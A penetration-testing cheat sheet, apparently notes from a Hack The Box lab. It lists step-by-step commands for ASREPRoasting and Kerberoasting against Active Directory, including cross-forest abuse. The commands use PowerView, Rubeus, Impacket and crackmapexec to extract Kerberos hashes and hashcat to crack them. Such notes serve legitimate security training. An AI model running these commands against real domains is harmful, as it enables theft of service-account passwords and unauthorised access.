# ASREPRoasting
### 1. Enumeration
```
PS C:\Tools> import-module .\PowerView.ps1
PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```

### 2. Retrieving AS-REP in Proper Format using Rubeus
```
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```
### 3. Retrieving the AS-REP Using Kerbrute
```
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```
### 4. Hunting for Users with Kerberos Pre-auth Not Required
```
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
```
### 5. Crack pass
```
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt 
```

# Kerberoasting
- Kerberoasting is an Active Directiory attack, that forcusing on offline password cracking from Service Accounts.
- The core mechaincs the way the flow TGS Ticket request. In AD, a Service Principal Names (SPN) is an unique identitier that Kerberos uses to map service instance to a service account. Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary. 
- TGS encrypted by hash's service account password. An attack can get service account's password thank to offlice brute force hash's password service account

## Attack from Linux 
Depending on your position in a network, this attack can be performed in multiple ways:
- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using runas /netonly.

### 1. Listing SPN Accounts with GetUserSPNs.py
- To do this, we will need a set of valid domain credentials and the IP address of a Domain Controller. We can authenticate to the Domain Controller with a cleartext password, NT password hash, or even a Kerberos ticket.
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```
### 2. Requesting TGS Tickets
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
```
- Requesting a Single TGS ticket
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```
### 3. Cracking the Ticket Offline with Hashcat
```
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```
### 4. Testing Authentication against a Domain Controller
```
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

## Attack from Windows
### 1. Using PowerView to Enumerate SPN Accounts
```
Get-DomainUser * -spn | select samaccountname
```
- Using PowerView to Target a Specific User
```
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```
- Exporting All Tickets to a CSV File
```
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

### 2. Using Rubeus
- Check password old. If we saw any SPN accounts with their passwords set 5 or more years ago, they could be promising targets as they could have a weak password that was set and never changed when the organization was less mature. Using the /stats Flag
```
.\Rubeus.exe kerberoast /stats
```
- Let's use Rubeus to request tickets for accounts with the admincount attribute set to 1. These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat. Be sure to specify the /nowrap flag so that the hash can be more easily copied down for offline cracking using Hashcat. 
```
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
- Other, we can request a new ticket for an user, with the /tgtdeleg flag to specify that we want only RC4 encryption when requesting a new service ticket.
```
.\Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap
```

### 3. Cracking the Ticket Offline with Hashcat

## Attacking Kerberoasting from Domain Trusts - Cross-Forest Trust Abuse 
## From Windows
### 1. Enumerating Accounts for Associated SPNs Using Get-DomainUser
```
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
```
- Enumerating the mssqlsvc Account
```
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
```
### 2. Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
```
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
```

## From Linux
### 1. Get TGS ticket using GetUserSPNs.py with -request Flag
```
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  
```